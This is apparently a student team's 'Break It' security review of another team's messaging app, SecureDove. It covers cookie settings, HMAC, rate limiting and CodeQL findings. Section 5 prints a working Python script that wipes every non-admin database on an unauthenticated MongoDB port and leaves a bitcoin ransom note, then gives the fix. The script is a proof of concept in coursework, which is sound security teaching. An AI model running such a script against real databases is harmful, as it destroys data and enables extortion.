<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_vetxgf6amqb2-8.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-8 0}ol.lst-kix_wt8803q90b88-4.start{counter-reset:lst-ctn-kix_wt8803q90b88-4 0}.lst-kix_wt8803q90b88-6>li{counter-increment:lst-ctn-kix_wt8803q90b88-6}ol.lst-kix_wt8803q90b88-7.start{counter-reset:lst-ctn-kix_wt8803q90b88-7 0}ol.lst-kix_wt8803q90b88-1.start{counter-reset:lst-ctn-kix_wt8803q90b88-1 0}ol.lst-kix_vetxgf6amqb2-5.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-5 0}.lst-kix_vetxgf6amqb2-8>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-8}ol.lst-kix_vetxgf6amqb2-6{list-style-type:none}ol.lst-kix_vetxgf6amqb2-7{list-style-type:none}ol.lst-kix_vetxgf6amqb2-2.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-2 0}ol.lst-kix_vetxgf6amqb2-8{list-style-type:none}.lst-kix_vetxgf6amqb2-7>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-7}.lst-kix_vetxgf6amqb2-8>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-8,lower-roman) ". "}ol.lst-kix_6s6ypeuehbmm-2.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-2 0}.lst-kix_6s6ypeuehbmm-8>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-8}ol.lst-kix_vetxgf6amqb2-0.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-0 0}.lst-kix_wt8803q90b88-7>li{counter-increment:lst-ctn-kix_wt8803q90b88-7}.lst-kix_wt8803q90b88-4>li{counter-increment:lst-ctn-kix_wt8803q90b88-4}ol.lst-kix_6s6ypeuehbmm-4{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-5{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-6{list-style-type:none}ol.lst-kix_vetxgf6amqb2-0{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-7{list-style-type:none}ol.lst-kix_vetxgf6amqb2-1{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-0{list-style-type:none}ol.lst-kix_vetxgf6amqb2-2{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-1{list-style-type:none}ol.lst-kix_vetxgf6amqb2-3{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-2{list-style-type:none}ol.lst-kix_vetxgf6amqb2-4{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-3{list-style-type:none}ol.lst-kix_vetxgf6amqb2-5{list-style-type:none}.lst-kix_wt8803q90b88-3>li{counter-increment:lst-ctn-kix_wt8803q90b88-3}.lst-kix_6s6ypeuehbmm-6>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-6}ol.lst-kix_6s6ypeuehbmm-8{list-style-type:none}.lst-kix_6s6ypeuehbmm-0>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-0}.lst-kix_vetxgf6amqb2-0>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-0,decimal) ". "}ol.lst-kix_6s6ypeuehbmm-5.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-5 0}.lst-kix_vetxgf6amqb2-2>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-2,lower-roman) ". "}.lst-kix_vetxgf6amqb2-1>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-1,lower-latin) ". "}.lst-kix_vetxgf6amqb2-4>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-4,lower-latin) ". "}.lst-kix_wt8803q90b88-7>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-7,lower-latin) ". "}.lst-kix_wt8803q90b88-8>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-8,lower-roman) ". "}.lst-kix_6s6ypeuehbmm-8>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-8,lower-roman) ". "}.lst-kix_vetxgf6amqb2-3>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-3,decimal) ". "}.lst-kix_vetxgf6amqb2-7>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-7,lower-latin) ". "}ol.lst-kix_wt8803q90b88-6.start{counter-reset:lst-ctn-kix_wt8803q90b88-6 0}.lst-kix_vetxgf6amqb2-6>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-6,decimal) ". "}.lst-kix_vetxgf6amqb2-5>li:before{content:"" counter(lst-ctn-kix_vetxgf6amqb2-5,lower-roman) ". "}.lst-kix_vetxgf6amqb2-5>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-5}.lst-kix_wt8803q90b88-0>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-0,decimal) ". "}ol.lst-kix_wt8803q90b88-0{list-style-type:none}ol.lst-kix_6s6ypeuehbmm-4.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-4 0}ol.lst-kix_vetxgf6amqb2-7.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-7 0}ol.lst-kix_wt8803q90b88-1{list-style-type:none}.lst-kix_wt8803q90b88-1>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-1,lower-latin) ". "}ol.lst-kix_wt8803q90b88-2{list-style-type:none}ol.lst-kix_wt8803q90b88-3{list-style-type:none}ol.lst-kix_wt8803q90b88-4{list-style-type:none}ol.lst-kix_wt8803q90b88-5{list-style-type:none}ol.lst-kix_wt8803q90b88-6{list-style-type:none}ol.lst-kix_wt8803q90b88-7{list-style-type:none}ol.lst-kix_wt8803q90b88-8{list-style-type:none}.lst-kix_wt8803q90b88-6>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-6,decimal) ". "}ol.lst-kix_wt8803q90b88-0.start{counter-reset:lst-ctn-kix_wt8803q90b88-0 0}.lst-kix_wt8803q90b88-5>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-5,lower-roman) ". "}.lst-kix_wt8803q90b88-3>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-3,decimal) ". "}.lst-kix_wt8803q90b88-4>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-4,lower-latin) ". "}.lst-kix_wt8803q90b88-2>li:before{content:"" counter(lst-ctn-kix_wt8803q90b88-2,lower-roman) ". "}ol.lst-kix_6s6ypeuehbmm-3.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-3 0}ol.lst-kix_vetxgf6amqb2-1.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-1 0}.lst-kix_6s6ypeuehbmm-3>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-3}.lst-kix_6s6ypeuehbmm-4>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-4}ol.lst-kix_6s6ypeuehbmm-6.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-6 0}ol.lst-kix_6s6ypeuehbmm-0.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-0 0}.lst-kix_vetxgf6amqb2-2>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-2}.lst-kix_wt8803q90b88-0>li{counter-increment:lst-ctn-kix_wt8803q90b88-0}.lst-kix_6s6ypeuehbmm-3>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-3,decimal) ". "}.lst-kix_vetxgf6amqb2-4>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-4}.lst-kix_6s6ypeuehbmm-2>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-2}.lst-kix_6s6ypeuehbmm-0>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-0,decimal) ". "}.lst-kix_6s6ypeuehbmm-4>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-4,lower-latin) ". "}.lst-kix_wt8803q90b88-1>li{counter-increment:lst-ctn-kix_wt8803q90b88-1}ol.lst-kix_wt8803q90b88-8.start{counter-reset:lst-ctn-kix_wt8803q90b88-8 0}.lst-kix_6s6ypeuehbmm-6>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-6,decimal) ". "}.lst-kix_6s6ypeuehbmm-7>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-7,lower-latin) ". "}.lst-kix_6s6ypeuehbmm-5>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-5,lower-roman) ". "}.lst-kix_6s6ypeuehbmm-5>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-5}.lst-kix_vetxgf6amqb2-1>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-1}ol.lst-kix_wt8803q90b88-5.start{counter-reset:lst-ctn-kix_wt8803q90b88-5 0}.lst-kix_6s6ypeuehbmm-1>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-1,lower-latin) ". "}.lst-kix_6s6ypeuehbmm-2>li:before{content:"" counter(lst-ctn-kix_6s6ypeuehbmm-2,lower-roman) ". "}ol.lst-kix_vetxgf6amqb2-6.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-6 0}ol.lst-kix_vetxgf6amqb2-3.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-3 0}ol.lst-kix_wt8803q90b88-2.start{counter-reset:lst-ctn-kix_wt8803q90b88-2 0}ol.lst-kix_6s6ypeuehbmm-1.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-1 0}.lst-kix_6s6ypeuehbmm-7>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-7}ol.lst-kix_6s6ypeuehbmm-8.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-8 0}.lst-kix_6s6ypeuehbmm-1>li{counter-increment:lst-ctn-kix_6s6ypeuehbmm-1}ol.lst-kix_wt8803q90b88-3.start{counter-reset:lst-ctn-kix_wt8803q90b88-3 0}ol.lst-kix_vetxgf6amqb2-4.start{counter-reset:lst-ctn-kix_vetxgf6amqb2-4 0}.lst-kix_vetxgf6amqb2-6>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-6}.lst-kix_wt8803q90b88-5>li{counter-increment:lst-ctn-kix_wt8803q90b88-5}ol.lst-kix_6s6ypeuehbmm-7.start{counter-reset:lst-ctn-kix_6s6ypeuehbmm-7 0}.lst-kix_wt8803q90b88-2>li{counter-increment:lst-ctn-kix_wt8803q90b88-2}.lst-kix_vetxgf6amqb2-3>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-3}.lst-kix_vetxgf6amqb2-0>li{counter-increment:lst-ctn-kix_vetxgf6amqb2-0}.lst-kix_wt8803q90b88-8>li{counter-increment:lst-ctn-kix_wt8803q90b88-8}ol{margin:0;padding:0}table td,table th{padding:0}.c3{background-color:#1e1f22;padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c16{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left;height:11pt}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c9{padding-top:24pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c18{color:#4f81bd;font-weight:700;font-size:16pt;font-family:"Times New Roman"}.c12{color:#000000;font-weight:700;font-size:11pt;font-family:"Arial"}.c15{color:#365f91;font-weight:700;font-size:16pt;font-family:"Times New Roman"}.c13{color:#cc0000;font-weight:700;font-size:11pt;font-family:"Arial"}.c7{font-size:10pt;font-family:"Courier New";color:#6aab73;font-weight:400}.c8{font-size:10pt;font-family:"Courier New";color:#cf8e6d;font-weight:400}.c10{font-size:10pt;font-family:"Courier New";color:#8888c6;font-weight:400}.c4{font-size:10pt;font-family:"Courier New";color:#bcbec4;font-weight:400}.c19{text-decoration:none;vertical-align:baseline;font-style:italic}.c17{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c11{text-decoration:none;vertical-align:baseline;font-style:normal}.c14{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c17 doc-content"><p class="c5"><span class="c1">Tina Costanza</span></p><p class="c5"><span class="c1">Chris Dearing</span></p><p class="c5"><span class="c1">Gurleen Rekhi</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c12 c19">See our CodeQL results.sarif report attached.</span></p><h1 class="c9" id="h.j8m1jzt94utm"><span class="c11 c15">418/518 Software Security</span></h1><h1 class="c9" id="h.z2ju5u5g40zy"><span class="c11 c18">Project Deliverable 3 - &ldquo;Break It&rdquo;</span></h1><p class="c0"><span class="c1"></span></p><p class="c5"><span>1. </span><span class="c6">User Authentication and Key Management</span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span class="c2">SecureDove&rsquo;s passwords are sufficiently long and complex enough. Passwords are securely hashed with bcrypt.</span></p><p class="c0"><span class="c2"></span></p><p class="c5"><span class="c2">Their authentication cookies are less secure. They never expire, which could lead to unwanted access. In addition, they lack a &ldquo;Secure&rdquo; attribute.</span></p><p class="c0"><span class="c2"></span></p><p class="c5"><span class="c2">This means they can be used with an http connection, and their tokens can be intercepted by a man-in-the-middle attack. This was flagged by our CodeQL report.</span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 574.90px; height: 372.97px;"><img alt="" src="images/image4.png" style="width: 574.90px; height: 372.97px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span>2. </span><span class="c6">Integrity via Message Authentication</span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span class="c2">The app correctly uses hmac authentication to ensure messages aren&rsquo;t tampered with between senders, and senders are who they say they are. The message content is correctly HTML escaped.</span></p><p class="c0"><span class="c2"></span></p><p class="c5"><span class="c2">The download directory cannot be used for file traversal. </span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 381.33px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 381.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">Directory traversal attempt:</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 128.00px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 128.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span>3. </span><span class="c6">Denial of Service (DOS) Attack Prevention</span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span class="c2">Their rate-limiting code is correctly implemented. After a number of persistent refreshes, the site displays this message and blocks the offender&rsquo;s IP:</span></p><p class="c0"><span class="c6"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 467.56px; height: 178.50px;"><img alt="" src="images/image1.png" style="width: 467.56px; height: 178.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span>4.</span><span class="c12 c11">&nbsp;CodeQL Report</span></p><p class="c0"><span class="c11 c12"></span></p><p class="c5"><span class="c1">CodeQL only found one minor vulnerability in SecureDove&rsquo;s server code:</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 69.33px;"><img alt="" src="images/image7.png" style="width: 624.00px; height: 69.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">When SecureDove creates authentication cookies, they do not set their &ldquo;Secure&rdquo; attributes to &ldquo;true&rdquo;. Setting them to &ldquo;true&rdquo; would ensure that they were only passed through https connections, NOT http.</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">However, this is forgivable, as their app is still in staging on localhost. </span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">For production, this should be fixed, as a hacker could downgrade the connection to http, stage a man-in-the-middle attack, and steal the auth token.</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c16">*results.sarif file included in .zip file</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span>5. </span><span class="c12 c11">Break It</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">By sticking to their security plan, SecureDove takes enough precautions to avoid MOST obvious attacks.</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c11 c13">However, we found one critical vulnerability that would cripple their app once launched.</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">SecureDove made the fatal error of exposing their external database port without implementing any database authentication.</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">As soon as they go live on a new domain, a hacker will inevitably run a script similar to this:</span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c0"><span class="c1"></span></p><p class="c3"><span class="c8">from </span><span class="c4">pymongo </span><span class="c8">import </span><span class="c4 c11">MongoClient</span></p><p class="c3 c14"><span class="c4 c11"></span></p><p class="c3"><span class="c4">client = MongoClient(</span><span class="c7">&quot;mongodb://localhost:27017/&quot;</span><span class="c4 c11">)</span></p><p class="c3 c14"><span class="c4 c11"></span></p><p class="c3"><span class="c8">if </span><span class="c4">__name__ == </span><span class="c7">&#39;__main__&#39;</span><span class="c4 c11">:</span></p><p class="c3"><span class="c4">&nbsp; &nbsp;</span><span class="c8">for </span><span class="c4">db </span><span class="c8">in </span><span class="c4 c11">client.list_database_names():</span></p><p class="c3"><span class="c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">if </span><span class="c4">db != </span><span class="c7">&quot;admin&quot;</span><span class="c4 c11">:</span></p><p class="c3"><span class="c4 c11">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;client.drop_database(db)</span></p><p class="c3"><span class="c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">print</span><span class="c4">(</span><span class="c7">f&quot;Dropped database: </span><span class="c8">{</span><span class="c4">db</span><span class="c8">}</span><span class="c7">&quot;</span><span class="c4 c11">)</span></p><p class="c3 c14"><span class="c4 c11"></span></p><p class="c3"><span class="c4">&nbsp; &nbsp;</span><span class="c10">print</span><span class="c4">(</span><span class="c7">&quot;All gone&quot;</span><span class="c4 c11">)</span></p><p class="c3 c14"><span class="c4 c11"></span></p><p class="c3"><span class="c4">&nbsp; &nbsp;new_db = client[</span><span class="c7">&quot;ransom&quot;</span><span class="c4 c11">]</span></p><p class="c3"><span class="c4">&nbsp; &nbsp;new_collection = new_db[</span><span class="c7">&quot;message&quot;</span><span class="c4 c11">]</span></p><p class="c3"><span class="c4">&nbsp; &nbsp;the_ransom = {</span><span class="c7">&quot;message&quot;</span><span class="c4">:</span><span class="c7">&quot;SEND BITCOIN IF U EVER WANT TO SEE UR PRECIOUS DATA AGAIN, HAIL PUTIN&quot;</span><span class="c4 c11">}</span></p><p class="c3"><span class="c4">&nbsp; &nbsp;new_collection.insert_one(the_ransom)</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">As shown here, the script removes SecureDove&rsquo;s databases and replaces them with a database called &ldquo;ransom&rdquo;: &nbsp;</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 148.00px;"><img alt="" src="images/image2.png" style="width: 624.00px; height: 148.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">When they enter &ldquo;ransom&rdquo;, they will see the hacker&rsquo;s message:</span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 72.00px;"><img alt="" src="images/image3.png" style="width: 624.00px; height: 72.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1"></span></p><p class="c5"><span class="c1">To patch this, all they need to do is delete the backdoor from their docker-compose file:</span></p><p class="c0"><span class="c1"></span></p><p class="c3"><span class="c8">ports</span><span class="c4 c11">:</span></p><p class="c3"><span class="c4">&nbsp;- </span><span class="c7">&quot;27017:27017&quot;</span></p></body></html>